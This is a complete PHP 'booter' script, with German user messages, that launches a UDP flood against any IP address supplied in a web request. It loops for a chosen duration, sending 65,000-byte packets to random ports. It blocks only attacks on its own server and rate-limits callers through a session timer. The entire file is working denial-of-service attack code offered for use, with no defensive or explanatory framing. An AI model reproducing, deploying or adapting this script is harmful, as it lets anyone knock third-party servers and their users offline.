<?php
session_start();
date_default_timezone_set("UTC");
$ti = "1459081950";
if(isset($_GET['host']) && isset($_GET['time']) && isset($_SESSION['time'])){
      $whiteListed =  array(
         "127.0.0.1",
         "localhost",
         $_SERVER['SERVER_ADDR'],
         $_SERVER['SERVER_NAME']
      );
      if(in_array($_GET['host'], $whiteListed)) {
         echo '{"success": false, "message": "Das DDosen dieses Servers ist nicht erlaubt."}';
         die();
      }
      $host = $_GET['host'];
      $time = $_GET['time'];
      if(is_numeric($time) && filter_var($host, FILTER_VALIDATE_IP)){
         if($_SESSION['time'] == "0"){
            $_SESSION['time'] = time() + ( $_GET['time'] * 2 );
            ddos($time, $host);
         }else{
            if(time() >  $_SESSION['time']){
               ddos($time, $host);
               $_SESSION['time'] = time() + ( $_GET['time'] * 2 );
            }else{
               $w = $_SESSION['time'] - time();
               echo '{"success": false, "message": "Du musst noch '.$w.'s warten."}';
               echo "{'success': false, 'message': 'Du musst noch {$w}s warten.'}";
            }
         }
     }else{
      echo '{"success": false, "message": "Deine Angaben waren Fehlerhaft."}';
     }
}
function ddos($time1, $host){
   $packets = 0;
   ignore_user_abort(TRUE);
   set_time_limit(0);
   $exec_time = $time1;
   $time = time();
   $max_time = $time+$exec_time;
   for($i=0;$i<65000;$i++){
      $out .= 'X';
   }
   while(1){
      $packets++;

      if(time() > $max_time){
          break;
      }

      $rand = rand(1,65000);
      $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);

      if($fp){
          fwrite($fp, $out);
          fclose($fp);
      }

   }
   $e = "Boot abgeschlossen: $packets (" . round(($packets*65)/1024, 2) . " MB) packets mit einem Durchschnitt von ". formatSizeUnits(round($packets/$time1, 2)) . " Packete pro Sekunde.";
   $e = htmlentities($e);
   echo '{"success": true, "message": "'.$e.'"}';
}

function formatSizeUnits($bytes)
{
   if ($bytes >= 1073741824)
   {
       $bytes = number_format($bytes / 1073741824, 2) . ' GB';
   }
   elseif ($bytes >= 1048576)
   {
       $bytes = number_format($bytes / 1048576, 2) . ' MB';
   }
   elseif ($bytes >= 1024)
   {
       $bytes = number_format($bytes / 1024, 2) . ' KB';
   }
   elseif ($bytes > 1)
   {
       $bytes = $bytes . ' bytes';
   }
   elseif ($bytes == 1)
   {
       $bytes = $bytes . ' byte';
   }
   else
   {
       $bytes = '0 bytes';
   }

   return $bytes;
}
?>
